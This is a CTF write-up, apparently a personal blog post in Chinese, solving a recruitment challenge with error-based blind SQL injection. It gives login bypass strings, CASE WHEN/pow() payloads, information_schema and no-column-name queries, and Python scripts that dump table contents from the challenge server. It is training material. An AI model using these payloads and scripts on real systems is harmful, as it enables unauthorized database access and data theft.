---
layout: post 
title: "V1lu0实验室招新hard_sql writeup"
date: 2020-06-23
author: su29029
tags: Web
---

## 0x00 前置知识

1.sql盲注。    

2.sql语法中ascii()函数，substr()等字符串处理函数，case when分支结构等控制语句。   

3.python脚本编写能力。    

## 0x01 解题

首先拿到题目，给出了一个登录框，并提示后台做了过滤。这里依然先尝试万能密码。```admin' or 1=1 #```发现登录成功，但是只有Login Success，没有其他任何信息。```admin' #``` 发现提示something wrong.

由于只提示有错误而不说明错误内容，这里无法使用联合查询或报错注入。故考虑盲注。   

给出第一步payload：

```
?user=1' and case (ascii(substr(database(),1,1))) when '104' then pow(999,999) end %23pass=123
```

解释一下，substr(string, index, length)函数用于截取string字符串从index位开始长度为length的子串，ascii()函数用于将字符转换为ascii码，case (statement) when '..' then ..... when '..' then ..... end类似switch的用法，判断某个statement的值，如果满足下面when的某个条件就执行then后的语句。而pow(999,999)执行一定会报错（数据溢出）。故如果```ascii(substr(database(),1,1))```的值等于104的话，数据库会报错，回显something wrong.如果值不等于，则不执行，回显wrong username password.这样我们通过判断database()的每一位是否等于某个ascii码转换后的值，就可以得出数据库名。    

```python
import requests

for i in range(1, 10):
    for j in range(32, 127):
        payload = "?user=1' and case (ascii(substr(database(), {},1))) when '{}' then pow(999,999) end %23&pass=123".format(i, j)
        url = "http://v8.su29029.xyz:10010/index.php" + payload
        r = requests.get(url)
        # print(j, end = " ")
        if (r.text.find('Something wrong') != -1):
            print(chr(j))
```

最终得到数据库名```hard_sql```.   

下一步爆表名。第二步payload：   

```
?user=1' and case (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema="hard_sql"),1,1))) when '102' then pow(999,999) end %23pass=123
```

通过group_concat函数查询表名。   

```python
import requests

for i in range(1, 15):
    for j in range(32, 127):
        payload = "?user=1' and case (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema=\"hard_sql\"), {},1))) when '{}' then pow(999,999) end %23&pass=123".format(i, j)
        url = "http://v8.su29029.xyz:10010/index.php" + payload
        r = requests.get(url)
        # print(j, end = " ")
        if (r.text.find('Something wrong') != -1):
            print(chr(j))
```

最终得到所有数据表名```flag,users```.   

最后一步获取列名，但是发现column被过滤且无法绕过，故考虑无列名注入。   

先判断列数，仍然使用上述payload来判断。   

```
?user=1' and case (ascii(substr((Select `1` from (Select 1 union Select * from hard_sql.flag) as a limit 1,1), 1,1))) when '1000' then pow(999,999) end %23&pass=123
```

发现提示something wrong.说明列数错误(因为ascii码值不可能等于1000，但是报错了说明是前面语句出现问题，在没有语法错误的情况下只可能是列数错误)，故增加列数，最后发现一共有5列。因为使用如下payload时没有提示something wrong 而是 wrong username password.   

```
?user=1' and case (ascii(substr((Select `1` from (Select 1,2,3,4,5 union Select * from hard_sql.flag) as a limit 1,1), 1,1))) when '1000' then pow(999,999) end %23&pass=123
```

爆出该表的所有列的所有内容(一行一行来)：   

```python
import requests
for m in range(1, 6):
    for i in range(1, 100):
        index = 0
        for j in range(127, 32, -1):
            payload = "?user=1' and case (ascii(substr((Select `{}` from (Select 1,2,3,4,5 union Select * from hard_sql.flag) as a limit 1,1), {},1))) when '{}' then pow(999,999) end %23&pass=123".format(m, i, j)
            url = "http://v8.su29029.xyz:10010/index.php" + payload
            r = requests.get(url)
            if (r.text.find('Something wrong') != -1):
                print(chr(j))
                index = 1
                break
        if (index == 0):
            break
    print("-----------------")
```

最终结果：   

```
flag{{{{{{{
```

```
mini~~~
```

```
flag{this_is_not_a_flag}
```

```
ffllaagg{{}}
```

```
flag{sql_1s_s0_c00000001lllll!!!!!!}
```
最后一个是真正的flag。   
成功获得flag。   